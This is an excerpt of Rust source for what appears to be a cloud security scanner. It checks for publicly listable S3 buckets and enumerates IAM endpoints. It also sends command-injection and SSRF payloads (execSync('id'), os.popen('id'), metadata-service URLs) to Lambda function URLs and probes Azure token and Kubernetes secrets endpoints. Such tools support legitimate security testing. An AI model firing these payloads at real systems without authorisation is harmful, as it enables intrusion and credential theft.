...
pub async fn s3(
    ...
    for url in &urls {
        match client.get(url).send().await {
            Ok(resp) => {
                ...
                let status_str = if listable { "LISTABLE".red().bold().to_string() }
                    else if exists { "EXISTS".green().to_string() }
                    else { "not found".to_string() };
                println!("  {} {:55} status={} {}", "*".cyan(), url, status, status_str);

                if listable {
                    println!("    {} [HIGH] Bucket is publicly listable!", ">".red().bold());
    ...
    match client.get(&perms_url).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            if status == 200 && body.contains("<AccessControlPolicy") {
                ...
                if body.contains("AllUsers") || body.contains("Everyone") {
                    println!("  {} Public access granted to AllUsers/Everyone!", "*".red());
                }
            } else if status == 403 {
...
pub async fn iam(
    ...
    let endpoints = [
        ("STS GetCallerIdentity", "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15", "GET"),
        ("IAM ListUsers", "https://iam.amazonaws.com/?Action=ListUsers&Version=2010-05-08", "GET"),
        ("IAM ListRoles", "https://iam.amazonaws.com/?Action=ListRoles&Version=2010-05-08", "GET"),
        ("IAM ListAccessKeys", "https://iam.amazonaws.com/?Action=ListAccessKeys&Version=2010-05-08", "GET"),
        ("IAM ListPolicies", "https://iam.amazonaws.com/?Action=ListPolicies&Version=2010-05-08", "GET"),
    ];

    for (name, url, method) in &endpoints {
        let req = if *method == "GET" { client.get(*url) } else { client.post(*url) };
        match req.send().await {
            Ok(resp) => {
                ...
                let status_str = if accessible { "ACCESSIBLE".red().bold().to_string() }
                    else if status == 403 { "denied".to_string() }
    ...
    println!("{} Note: These endpoints require AWS credentials (use --token with AWS access key).", "[*]".cyan().bold());
    Ok(())
}
...
pub async fn lambda(
    ...
    let payloads = [
        ...
        ("SSRF metadata", r#"{"url":"http://169.254.169.254/latest/meta-data/"}"#),
        ("Node.js eval", r#"{"code":"require('child_process').execSync('id').toString()}"}"#),
        ("Python exec", r#"{"exec":"__import__('os').popen('id').read()"}"#),
        ("Command via event", r#"{"event":{"cmd":"id"}}"#),
    ];

    for (name, payload) in &payloads {
        match client.post(function_url)
            ...
            .await
        {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let interesting = body.contains("uid=") || body.contains("root") ||
                    body.contains("AWS_") || body.contains("ami-") ||
                    body.contains("169.254") || body.contains("bin/sh");
                let status_str = if interesting { "INTERESTING OUTPUT".red().bold().to_string() }
                    else if status == 200 { "ok".to_string() }
                    else { format!("status {}", status) };
                println!("  {} {:30} status={} {}", "*".cyan(), name, status, status_str);

                if interesting {
                    println!("    {} Output: {}", ">".red().bold(), body.chars().take(300).collect::<String>());
                }
            }
            Err(_) => {
                println!("  {} {:30} error", "*".cyan(), name);
...
pub async fn metadata(
    ...
    let metadata_urls = [
        ...
        ("Azure Token", "http://169.254.169.254/metadata/identity/oauth2/token"),
        ("K8s Service Account", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"),
    ];
    ...
    for (name, metadata_url) in &metadata_urls {
        ...
        match req.send().await {
            Ok(resp) => {
                ...
                let status_str = if interesting { "EXPOSED".red().bold().to_string() }
